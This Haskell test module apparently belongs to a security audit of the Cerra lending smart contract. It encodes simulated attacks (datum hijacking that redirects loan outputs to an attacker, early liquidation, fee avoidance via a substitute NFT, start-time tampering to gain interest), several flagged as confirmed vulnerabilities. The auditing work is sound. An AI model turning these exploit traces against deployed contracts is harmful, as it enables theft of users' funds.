{-# LANGUAGE GADTs #-}
{-# LANGUAGE TypeApplications #-}

module Audit.Attacks where

import Audit.Endpoints qualified as EP
import Audit.Traces
import Audit.Utils
import Cerra.Lending.Contract.Lending.OnChain qualified as Cerra
import Cerra.Lending.Contract.Lending.Types qualified as Cerra
import Cerra.Lending.Utils.Settings qualified as Cerra
import Cerra.Lending.Utils.Utils qualified as Cerra
import Control.Monad
import Cooked qualified as C
import Data.Default
import Data.Map qualified
import Data.Maybe (isJust)
import Ledger.Slot qualified as Pl
import Optics.Core qualified as Optic
import Plutus.Script.Utils.Typed qualified as Pl
import Plutus.Script.Utils.V2.Scripts qualified as Pl
import Plutus.Script.Utils.Value qualified as Pl
import Plutus.V2.Ledger.Api qualified as Pl
import PlutusTx.AssocMap qualified as Map
import Test.Tasty qualified as Tasty
import Test.Tasty.ExpectedFailure qualified as Tasty
import Test.Tasty.HUnit qualified as Tasty

allTests :: Tasty.TestTree
allTests =
  Tasty.testGroup
    "Attacks"
    [ Tasty.testCase "Attempting to cancel a loan without burning factory NFT." $
        C.testFailsFrom def (C.isCekEvaluationFailure def) initDist cancelLoanRequestWithoutBurningNFT,
      Tasty.testCase "Attempting to cancel a loan and minting a wrong other NFT." $
        C.testFailsFrom def (C.isCekEvaluationFailure def) initDist cancelLoanRequestMintingWrongToken,
      Tasty.testCase "Attempting to cancel a loan and burning a wrong other NFT." $
        C.testFailsFrom def (C.isCekEvaluationFailure def) initDist cancelLoanRequestBurningWrongToken,
      Tasty.testCase "Attempting to replace Factory NFT and avoid paying fees." $
        C.testFailsFrom def (C.isCekEvaluationFailure def) initDist createLoanRequestDummyNft,
      -- This is not a vulnerability, but it shows that we can go
      -- through the whole workflow of the product with a different
      -- token than the factory token
      Tasty.testCase "Attempting to replace Factory NFT throughout the lifetime of a loan." $
        C.testSucceedsFrom def initDist wholeLifetimeWithDummyToken,
      -- Vulnerability: liquidate loan before the dealine
      Tasty.expectFail $
        Tasty.testCase "Liquidation of a loan before the deadline" $
          C.testFailsFrom def (C.isCekEvaluationFailure def) initDist liquidateBeforeDeadline,
      Tasty.testCase "Attempting to create an unredeemable utxos while minting borrower token for free" $
        C.testFailsFrom def (C.isCekEvaluationFailure def) initDist mintBorrowerAndCreateLockedUtxo,
      Tasty.testCase "Attempting to datum highjack when creating loan request" $
        C.testFailsFrom def (C.isCekEvaluationFailure def) initDist datumHijackingAttackCreateLoanRequest,
      -- Vulnerability: datum highjacking when accepting a loan request through a dummy script
      Tasty.expectFail $
        Tasty.testCase "Attempting to datum highjack when accepting a loan request through a dummy script." $
          C.testFailsFrom def (C.isCekEvaluationFailure def) initDist datumHijackingAttackAcceptLoanRequest,
      -- Vulnerability: datum highjacking when accepting a loan request directly to a pkh
      Tasty.expectFail $
        Tasty.testCase "Attempting to datum highjack when accepting a loan request directly to a pkh." $
          C.testFailsFrom def (C.isCekEvaluationFailure def) initDist datumHijackingAttackAcceptLoanRequestToPubKey,
      -- Vulnerability: datum highjacking when accepting a loan request directly to a pkh
      Tasty.expectFail $
        Tasty.testCase "Attempting to datum highjack when accepting a borrow request directly to a pkh." $
          C.testFailsFrom def (C.isCekEvaluationFailure def) initDist datumHijackingAttackAcceptBorrowRequestToPubKey,
      -- Vulnerability: datum highjacking when repaying a loan request directly to a pkh
      Tasty.expectFail $
        Tasty.testCase "Attempting to datum highjack when repaying a loan directly to a pkh." $
          C.testFailsFrom def (C.isCekEvaluationFailure def) initDist datumHijackingAttackRepayLoanToPubKey,
      -- Vulnerability: datum highjacking when accepting a loan offer from 2 different loans.
      Tasty.expectFail $
        Tasty.testCase "Full scenario of a two-loans datum hijacking." $
          C.testFailsFrom def (C.isCekEvaluationFailure def) initDist datumHijackingSeveralOffers,
      -- Vulnerability: setting the start time to 0 to get more interest.
      Tasty.expectFail $
        Tasty.testCase "Setting wrong strat time when accepting borrow offer." $
          C.testFailsFrom def (C.isCekEvaluationFailure def) initDist startsAt0Attack
    ]

-- | Vulnerability: liquidation before deadline
liquidateBeforeDeadline :: C.MonadBlockChain m => m ()
liquidateBeforeDeadline = do
  (loanTxOutRef, bobTxOutRef, nftTxOutRef, referenceLendingTxOutRef) <- createBorrowRequest
  (aliceTxOutRef, _) : _ <- C.runUtxoSearch $ C.utxosAtSearch aliceAddr
  (loanTxOutRef', aliceTxOutRef') <- EP.acceptBorrowRequest alice loanTxOutRef aliceTxOutRef referenceLendingTxOutRef
  (loanTxOutRef'', _) <- EP.withdrawLoan bob loanTxOutRef' bobTxOutRef referenceLendingTxOutRef
  -- Let's NOT wait a little to exceed the loan deadline
  msPerSlot <- getMsPerSlot
  now <- C.currentSlot
  EP.liquidateOnExpiration alice (now + Pl.Slot ((100 * 60 * 1000) `div` msPerSlot)) loanTxOutRef'' nftTxOutRef loanTxOutRef aliceTxOutRef' referenceLendingTxOutRef

-- Here we try to cancel a loan request and keep the factory NFT
cancelLoanRequestWithoutBurningNFT :: C.MonadModalBlockChain m => m ()
cancelLoanRequestWithoutBurningNFT = do
  (loanTxOutRef, lenderTxOutRef, nftTxOutRef, referenceLendingTxOutRef) <- createLoanRequest
  EP.cancelLoanRequest alice loanTxOutRef lenderTxOutRef nftTxOutRef referenceLendingTxOutRef
    `C.withTweak` C.removeMintTweak
      (\(x, _, _, _) -> x == Pl.Versioned factoryPolicy Pl.PlutusV2)

-- Here we try to redirect the factory NFT and mint something else instead
cancelLoanRequestMintingWrongToken :: C.MonadModalBlockChain m => m ()
cancelLoanRequestMintingWrongToken = do
  (loanTxOutRef, lenderTxOutRef, nftTxOutRef, referenceLendingTxOutRef) <- createLoanRequest
  EP.cancelLoanRequest alice loanTxOutRef lenderTxOutRef nftTxOutRef referenceLendingTxOutRef
    `C.withTweak` ( do
                      [(_, _, tk, _)] <- C.removeMintTweak $ \(x, _, _, _) -> x == Pl.Versioned factoryPolicy Pl.PlutusV2
                      C.addOutputTweak $ C.paysPK alicePkh $ mkFactoryToken tk
                      C.addMintTweak (Pl.Versioned C.quickCurrencyPolicy Pl.PlutusV2, C.NoMintsRedeemer, "dummy", 1)
                      C.addOutputTweak $ C.paysPK alicePkh (C.quickValue "dummy" 1)
                  )

-- Here we try to redirect the factory NFT and burn something else instead
cancelLoanRequestBurningWrongToken :: C.MonadModalBlockChain m => m ()
cancelLoanRequestBurningWrongToken = do
  (loanTxOutRef, lenderTxOutRef, nftTxOutRef, referenceLendingTxOutRef) <- createLoanRequest
  void $
    C.validateTxSkel $
      C.txSkelTemplate
        { C.txSkelMints = C.txSkelMintsFromList [(Pl.Versioned C.quickCurrencyPolicy Pl.PlutusV2, C.NoMintsRedeemer, "dummy", 1)],
          C.txSkelOuts = [C.paysPK alicePkh (Pl.assetClassValue (Pl.AssetClass (Pl.scriptCurrencySymbol C.quickCurrencyPolicy, "dummy")) 1)],
          C.txSkelSigners = [alice],
          C.txSkelOpts = def {C.txOptEnsureMinAda = True}
        }
  EP.cancelLoanRequest alice loanTxOutRef lenderTxOutRef nftTxOutRef referenceLendingTxOutRef
    `C.withTweak` ( do
                      [(_, _, tk, _)] <- C.removeMintTweak $ \(x, _, _, _) -> x == Pl.Versioned factoryPolicy Pl.PlutusV2
                      C.addOutputTweak $ C.paysPK alicePkh $ mkFactoryToken tk
                      C.addMintTweak (Pl.Versioned C.quickCurrencyPolicy Pl.PlutusV2, C.NoMintsRedeemer, "dummy", -1)
                  )

factoryToQuickTweak :: C.MonadTweak m => m Int
factoryToQuickTweak = do
  mints <- C.removeMintTweak $ \(x, _, _, _) -> x == Pl.Versioned factoryPolicy Pl.PlutusV2
  forM_ mints $ \(_, _, tk, nb) -> C.addMintTweak (Pl.Versioned C.quickCurrencyPolicy Pl.PlutusV2, C.NoMintsRedeemer, tk, nb)
  outs <- C.viewTweak C.txSkelOutsL
  let outs_mod = modifyOut factoryCurrencySymbol C.quickCurrencySymbol <$> outs
  C.setTweak C.txSkelOutsL (snd <$> outs_mod)
  return $ length mints + length (filter fst outs_mod)
  where
    modifyOut :: Pl.CurrencySymbol -> Pl.CurrencySymbol -> C.TxSkelOut -> (Bool, C.TxSkelOut)
    modifyOut from to out =
      if (Map.member from . Pl.getValue . C.txSkelOutValue) out
        then (True, Optic.set C.txSkelOutValueL (replace (C.txSkelOutValue out) from to) out)
        else (False, out)
    -- Replacing a certain currency symbol in a value with another one
    replace :: Pl.Value -> Pl.CurrencySymbol -> Pl.CurrencySymbol -> Pl.Value
    replace (Pl.Value val) from to = Pl.Value $ case Map.lookup from val of
      Nothing -> val
      Just x -> Map.unionWith (Map.unionWith (+)) (Map.singleton to x) (Map.delete from val)

removeFeeTweak :: C.MonadTweak m => m Int
removeFeeTweak =
  length
    <$> C.removeOutputTweak
      ( \(C.Pays out) ->
          isJust $ C.isPKOutputFrom Cerra.treasuryPubKeyHash out
      )

-- Here we try to create a loan and replace the factory NFT with another token, attempting to skip paying the fees
createLoanRequestDummyNft :: C.MonadModalBlockChain m => m ()
createLoanRequestDummyNft =
  void $
    C.somewhere
      ( do
          count1 <- removeFeeTweak
          count2 <- factoryToQuickTweak
          when (count1 + count2 == 0) mzero
      )
      createLoanRequest

-- The whole lifetime of the app, but with a wrong factory token
wholeLifetimeWithDummyToken :: C.MonadModalBlockChain m => m ()
wholeLifetimeWithDummyToken =
  void $ C.everywhere factoryToQuickTweak collectLoan

-- Attempting to mint a borrower token for free and create a locked utxo
mintBorrowerAndCreateLockedUtxo :: C.MonadModalBlockChain m => m ()
mintBorrowerAndCreateLockedUtxo = do
  let datumIn :: Cerra.LendingDatum
      datumIn = def {Cerra.scLenderNFT = Just "dummy"}
  tx1 <-
    C.validateTxSkel $
      C.txSkelTemplate
        { C.txSkelOuts = [C.paysPK alicePkh minAda `C.withDatum` datumIn],
          C.txSkelSigners = [alice]
        }
  let aliceTxOutRef = fst $ head $ C.utxosFromCardanoTx tx1
      tokenName = Cerra.mkNftTokenName aliceTxOutRef
      datumOut = datumIn {Cerra.scBorrowerNFT = Just tokenName}
  void $
    C.validateTxSkel $
      C.txSkelTemplate
        { C.txSkelIns = Data.Map.singleton aliceTxOutRef C.TxSkelNoRedeemerForPK,
          C.txSkelOuts =
            [ C.paysPK alicePkh $ mkBorrowerToken tokenName,
              C.paysScript Cerra.lendingValidator datumOut (mkFactoryToken tokenName <> minAda <> datumToLoanValue datumIn)
            ],
          C.txSkelMints =
            C.txSkelMintsFromList
              [ (Pl.Versioned factoryPolicy Pl.PlutusV2, C.SomeMintsRedeemer aliceTxOutRef, tokenName, 1),
                (Pl.Versioned borrowerPolicy Pl.PlutusV2, C.SomeMintsRedeemer aliceTxOutRef, tokenName, 1)
              ],
          C.txSkelSigners = [alice],
          C.txSkelOpts = def {C.txOptEnsureMinAda = True}
        }

-- Attempting to hijack a utxo to a script with a similar datum
datumHijackingAttackCreateLoanRequest :: C.MonadModalBlockChain m => m ()
datumHijackingAttackCreateLoanRequest =
  C.there
    0
    (C.datumHijackingAttack @Cerra.Lending (isJust . C.isScriptOutputFrom Cerra.lendingValidator) (const True))
    (void createLoanRequest)

datumHijackingAttackAcceptLoanRequest :: C.MonadModalBlockChain m => m ()
datumHijackingAttackAcceptLoanRequest = do
  C.there
    2
    (C.datumHijackingAttack @Cerra.Lending (isJust . C.isScriptOutputFrom Cerra.lendingValidator) (const True))
    acceptLoanRequest
  (dhTxOutref, dhTxOut) : _ <- C.runUtxoSearch $ C.utxosAtSearch $ Pl.validatorAddress C.datumHijackingTarget
  void $
    C.validateTxSkel $
      C.txSkelTemplate
        { C.txSkelIns = Data.Map.singleton dhTxOutref $ C.TxSkelRedeemerForScript (),
          C.txSkelOuts = [C.paysPK bobPkh $ Pl.txOutValue dhTxOut],
          C.txSkelSigners = [bob]
        }

redirectCerraOutputToPkTweak :: C.MonadTweak m => Pl.PubKeyHash -> m ()
redirectCerraOutputToPkTweak userPkh = do
  [out] <- C.removeOutputTweak (\(C.Pays out) -> isJust $ C.isScriptOutputFrom Cerra.lendingValidator out)
  let Just datum = C.txSkelOutTypedDatum @Cerra.LendingDatum $ Optic.view C.txSkelOutDatumL out
  C.addOutputTweak $ C.paysPK userPkh (C.txSkelOutValue out) `C.withDatum` datum

datumHijackingAttackAcceptLoanRequestToPubKey :: C.MonadModalBlockChain m => m ()
datumHijackingAttackAcceptLoanRequestToPubKey =
  C.there 2 (redirectCerraOutputToPkTweak bobPkh) acceptLoanRequest

datumHijackingAttackAcceptBorrowRequestToPubKey :: C.MonadModalBlockChain m => m ()
datumHijackingAttackAcceptBorrowRequestToPubKey =
  C.there 2 (redirectCerraOutputToPkTweak alicePkh) acceptBorrowRequest

datumHijackingAttackRepayLoanToPubKey :: C.MonadModalBlockChain m => m ()
datumHijackingAttackRepayLoanToPubKey =
  C.there 5 (redirectCerraOutputToPkTweak bobPkh) repayLoan

-- A detailed trace where bob steals loan assets from Alice and Carrie
datumHijackingSeveralOffers :: C.MonadModalBlockChain m => m ()
datumHijackingSeveralOffers = do
  -- We retrieve a utxo from alice and carrie, which will be used later on to create unique token names
  (aliceTxOutRef, _) : _ <- C.runUtxoSearch $ C.utxosAtSearch aliceAddr
  (carrieTxOutRef, _) : _ <- C.runUtxoSearch $ C.utxosAtSearch carrieAddr
  -- We create datums associated with those utxos
  let aliceDatum = def {Cerra.scLenderNFT = Just $ Cerra.mkNftTokenName aliceTxOutRef}
      carrieDatum = def {Cerra.scLenderNFT = Just $ Cerra.mkNftTokenName carrieTxOutRef}
  -- We create loan requests with the aformentioned token names.
  -- In the process, alice and carrie put their lending assets into the script.
  (aliceLoanTxOutRef, _) <- EP.createLoanRequest aliceDatum alice aliceTxOutRef
  (carrieLoanTxOutRef, _) <- EP.createLoanRequest carrieDatum carrie carrieTxOutRef
  -- We create a utxo to host the lending script to be used later on as reference script
  referenceLendingTxOutRef <- EP.createReferenceLending cerraAdmin cerraAdmin
  -- Now bob wants to accept the loan offers. He needs utxos for unique borrower token names.
  (bobTxOutRef1, _) : (bobTxOutRef2, _) : _ <- C.runUtxoSearch $ C.filterWithOnlyAda $ C.utxosAtSearch bobAddr
  -- Bob realizes that he can actually steal those assets.
  -- For that purpose, he redirects the script output to himself, while providing everything else needed by the transaction,
  -- Including the utxos to be used for the borrower token names
  void $ EP.acceptLoanRequest bob aliceLoanTxOutRef bobTxOutRef1 referenceLendingTxOutRef `C.withTweak` redirectCerraOutputToPkTweak bobPkh
  void $ EP.acceptLoanRequest bob carrieLoanTxOutRef bobTxOutRef2 referenceLendingTxOutRef `C.withTweak` redirectCerraOutputToPkTweak bobPkh
  -- For readability purpose, we then regroup utxos from peer that do not contain only ada.
  -- In the resulting blockchain state, we will see that bob own all assets lent by Alice and Carrie, alongside the borrower and factory nfts.
  forM_ [alice, bob, carrie] aggregateUtxosOfPeer
  where
    aggregateUtxosOfPeer :: C.MonadModalBlockChain m => C.Wallet -> m ()
    aggregateUtxosOfPeer peer = do
      result <- C.runUtxoSearch $ C.filterWithNotOnlyAda $ C.utxosAtSearch $ C.walletAddress peer
      let (spends, value) =
            foldr
              ( \(txOutRef, val) (accSpends, accValue) ->
                  (Data.Map.insert txOutRef C.TxSkelNoRedeemerForPK accSpends, accValue <> val)
              )
              (Data.Map.empty, mempty)
              result
      void $
        C.validateTxSkel $
          C.txSkelTemplate
            { C.txSkelIns = spends,
              C.txSkelOuts = [C.paysPK (C.walletPKHash peer) value],
              C.txSkelSigners = [peer]
            }

-- Attempting to steal interests from the borrower when accepting the borrow offer
startsAt0Attack :: C.MonadModalBlockChain m => m ()
startsAt0Attack = do
  void $ C.waitNSlots 1000
  C.there
    2
    ( do
        let firstSlot = Pl.Slot 0
        (first_ms, _) <- C.slotToTimeInterval firstSlot
        void $ C.setValidityStartTweak firstSlot
        void $ C.tamperDatumTweak @Cerra.LendingDatum (\x -> Just $ x {Cerra.scLoanStartTime = Just first_ms})
    )
    collectLoan
